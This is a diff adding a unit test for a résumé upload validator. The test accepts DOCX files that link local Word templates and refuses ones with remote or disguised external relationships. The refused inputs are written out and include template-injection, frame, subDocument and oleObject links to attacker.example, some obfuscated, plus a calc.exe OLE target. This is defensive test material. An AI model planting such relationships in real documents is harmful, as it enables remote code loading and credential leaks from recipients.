@@ -63,6 +63,39 @@ describe("validation et quarantaine des CV", () => {
     const hyperlink = buildDocx(["CV"], [{ name: "word/_rels/document.xml.rels", content: '<Relationships><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.linkedin.com/in/example" TargetMode="External"/></Relationships>' }]);
     expect(validateCvFile({ buffer: hyperlink, mimeType: DOCX, originalName: "cv.docx", size: hyperlink.length }).mimeType).toBe(DOCX);
   });
+
+  it("accepte un CV créé depuis un modèle Word local, refuse un modèle, cadre ou objet distant même déguisé", () => {
+    const REL = "http://schemas.openxmlformats.org/officeDocument/2006/relationships";
+    const docxWithSettingsRels = (relationships: string) => buildDocx(["CV"], [
+      { name: "word/_rels/settings.xml.rels", content: `<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">${relationships}</Relationships>` },
+      { name: "word/_rels/document.xml.rels", content: `<Relationships><Relationship Id="rId9" Type="${REL}/hyperlink" Target="https://www.linkedin.com/in/jdupont" TargetMode="External"/></Relationships>` },
+    ]);
+    const accepted = [
+      `<Relationship Id="rId1" Type="${REL}/attachedTemplate" Target="file:///C:\\Users\\jdupont\\AppData\\Roaming\\Microsoft\\Templates\\Modern%20chronological%20resume.dotx" TargetMode="External"/>`,
+      `<Relationship Id="rId1" Type="${REL}/attachedTemplate" Target="file:///Users/jdupont/Library/Group%20Containers/UBF8T346G9.Office/User%20Content.localized/Templates.localized/Normal.dotm" TargetMode="External"/>`,
+      `<Relationship Id="rId1" Type="${REL}/attachedTemplate" Target="C:\\Modeles\\CV.dotx" TargetMode="External"/>`,
+    ];
+    for (const relationship of accepted) {
+      const docx = docxWithSettingsRels(relationship);
+      expect(validateCvFile({ buffer: docx, mimeType: DOCX, originalName: "cv.docx", size: docx.length }).mimeType).toBe(DOCX);
+    }
+    const refused = [
+      `<Relationship Id="rId1" Type="${REL}/attachedTemplate" Target="\\\\attacker.example\\share\\t.dotm" TargetMode="External"/>`,
+      `<Relationship Id="rId1" Type="${REL}/attachedTemplate" Target="file://attacker.example/share/t.dotm" TargetMode="External"/>`,
+      `<Relationship Id="rId1" Type="${REL}/attachedTemplate" Target="file:////attacker.example/share/t.dotm" TargetMode="External"/>`,
+      `<Relationship Id="rId1" Type="${REL}/attachedTemplate" Target="file:///\\\\attacker.example\\share\\t.dotm" TargetMode="External"/>`,
+      `<Relationship Id="rId1" Type="${REL}/attachedTemplate" Target="&#104;ttps://attacker.example/t.dotm" TargetMode="External"/>`,
+      `<Relationship Id="rId1" Type="${REL}/frame" Target="https://attacker.example/frame.html" TargetMode="External"/>`,
+      `<Relationship Id="rId1" Type="${REL}/subDocument" Target="http://attacker.example/sub.docx" TargetMode="External"/>`,
+      `<Relationship Id="rId1" Type="${REL}/oleObject" Target="file:///C:/Windows/System32/calc.exe" TargetMode="External"/>`,
+      `<Relationship Id='rId1' TargetMode='External' Type='${REL}/attachedTemplate' Target='https://attacker.example/t.dotm'/>`,
+      `<Relationship Id="rId1" Note="a>b" Type="${REL}/attachedTemplate" Target="https://attacker.example/t.dotm" TargetMode="External"/>`,
+    ];
+    for (const relationship of refused) {
+      const docx = docxWithSettingsRels(relationship);
+      expect(() => validateCvFile({ buffer: docx, mimeType: DOCX, originalName: "cv.docx", size: docx.length }), relationship).toThrow("cv_validation_docx_active_content");
+    }
+  });
 });
 
 describe("bombes de décompression : plafonds avant extraction", () => {
